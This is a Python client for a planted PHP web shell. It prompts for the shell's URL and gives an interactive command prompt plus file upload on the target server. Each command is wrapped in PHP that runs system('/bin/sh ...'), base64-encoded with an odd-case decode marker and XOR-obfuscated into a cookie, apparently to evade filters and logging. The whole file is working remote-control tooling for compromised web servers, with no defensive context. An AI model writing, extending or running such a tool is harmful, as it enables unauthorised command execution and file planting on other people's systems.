import requests
import base64
import struct
import binascii
import urllib3
import urllib.parse
import random
import string
import re
import sys
from requests.exceptions import RequestException
urllib3.disable_warnings()

def sxor(s1, s2):
    return bytes(''.join(chr(ord(a) ^ ord(b)) for a, b in zip(s1, s2)), encoding="utf8")

def byte2hex(bins):
    return ''.join(["%02X" % x for x in bins]).strip()

def pack_data(b64_str,key):
	v = struct.pack(f'{len(b64_str)}s', bytes(b64_str, encoding="utf8"))
	xor = key + '6970a8e2-1f67-4d93-8fec-8edd9bf9a597'
	xor *= len(v) // len(key) + 1
	pack_data = sxor(v.decode(), xor[:len(v)])
	send = struct.unpack(f'{len(pack_data)}s', pack_data)
	send = binascii.b2a_hex(send[0]).decode()
	return send

def salt(len):
	salt = ''.join(random.sample(string.ascii_letters + string.digits, len))
	return salt

# def cmd_encode(comm,key):

# 	code = b64_encode(f"system('{comm}');")
# 	b64 = f'{salt(8)}#BaSE64_dEcOdE#{code}'
# 	# b64 = f'{salt(comm)}#base64_decode#{code}'

# 	# print(b64)
# 	send=pack_data(b64,key)
# 	# print(send)
# 	return send
def b64_encode(string):
	return base64.b64encode(bytes(string, encoding="utf8")).decode()

def send_encode(feature,current_dir,key,comm='',file_dir='',target_dir=''):
	if feature=="upload":
		code=f'''
		@ini_set("display_errors","0");
		@set_time_limit(0);
		@set_magic_quotes_runtime(0);
		echo("=>|");;
		$f=base64_decode($_POST["aa"]);
		$c=$_POST["bb"];
		$c=str_replace("\\r","",$c);
		$c=str_replace("\\n","",$c);
		$buf="";for($i=0;$i<strlen($c);$i+=2)
		$buf.=urldecode("%".substr($c,$i,2));
		echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");;
		$p=base64_decode('{b64_encode('/bin/sh')}');
		$s=base64_decode('{b64_encode(f'cd {current_dir};echo [S];pwd;echo [E]')}');
		$d=dirname($_SERVER["SCRIPT_FILENAME"]);
		$c=substr($d,0,1)=="/"?"-c \\"{{$s}}\\"":"/c \\"{{$s}}\\"";
		$r="{{$p}} {{$c}}";
		@system($r." 2>&1",$ret);
		print ($ret!=0)?"ret={{$ret}}":"";;
		echo("|<=");;die();;'''
	elif feature=="cmd":
		code=f'''
		@ini_set("display_errors","0");
		@set_time_limit(0);
		@set_magic_quotes_runtime(0);
		echo("=>|");;
		$p=base64_decode('{b64_encode('/bin/sh')}');
		$s=base64_decode('{b64_encode(f'cd {current_dir};{comm};echo [S];pwd;echo [E]')}');
		$d=dirname($_SERVER["SCRIPT_FILENAME"]);
		$c=substr($d,0,1)=="/"?"-c \\"{{$s}}\\"":"/c \\"{{$s}}\\"";
		$r="{{$p}} {{$c}}";
		@system($r." 2>&1",$ret);
		print ($ret!=0)?"ret={{$ret}}":"";;echo("|<=");;die();;'''

	code=b64_encode(code)
	b64=f'{salt(8)}#BaSE64_dEcOdE#{code}'
	send=pack_data(b64,key)
	return send

def upload_encode(file_dir,target_dir,current_dir,key):
	if target_dir.startswith('/'):
		pass
	else:
		target_dir=current_dir+('/' if current_dir!='/' else '')+target_dir
	with open(file_dir,'rb') as f:
		hexstr_data=byte2hex(f.read())
	send=send_encode("upload",current_dir,key,file_dir=file_dir,target_dir=target_dir)
	target_dir=b64_encode(target_dir)
	post={'aa':target_dir,'bb':hexstr_data}
	return send,post

def simulated_shell(comm,current_dir,key):
	send=send_encode('cmd',current_dir,key,comm=comm)
	return send

def loop(url,current_dir='/'):
	p_result=re.compile(r"(=>\|)+?(.*)(\|<=)+?",re.S)
	p_dir=re.compile(r"(.*)\[S\]\n(.*)\n\[E\]",re.S)
	key = salt(4)
	# print(key)
	
	comm = input(f'[{current_dir}]$ ')
	
	post={}
	if comm.lower() == 'q':
		exit(0)
	elif comm.lower() == 'u':
		file_dir=input('upload file>')
		target_dir=input('target file>')
		send_cookie,post=upload_encode(file_dir,target_dir,current_dir,key)
	else:
		send_cookie=simulated_shell(comm,current_dir,key)
	cookies = {key: send_cookie}

	print()
	try:
		r = requests.post(url,
		                 cookies=cookies,data=post,verify=False,timeout=(4,15))
		# r.raise_for_status()
		if r.status_code != requests.codes.ok:
			print(f"[-] recive code: {r.status_code}\nexit...")
			exit(0)
	except RequestException as e:
		raise e
		print('read time out!')
		loop(url,current_dir=current_dir)
	try:
		s1=re.findall(p_result, r.text)[0][1]
	except Exception as e:
		print(e)
		print(r.text)
	else:
		# print(r.text)
		if re.findall(p_dir, s1)[0][0]=='1':
			print('upload success!')

		elif re.findall(p_dir, s1)[0][0]=='0':
			print('upload fail!')
		else:
			print(re.findall(p_dir, s1)[0][0])
	finally:
		loop(url,current_dir=re.findall(p_dir, r.text)[0][1])

def main(url):
	# comm = input('input>')
	sys.setrecursionlimit(10000)
	print("\nCurent recursion limit is set to:",sys.getrecursionlimit())
	print("Curent shell url:",url)
	print()
	loop(url=url)

if __name__ == '__main__':
	url=input('Please input shell url:')
	# url=''
	main(url)


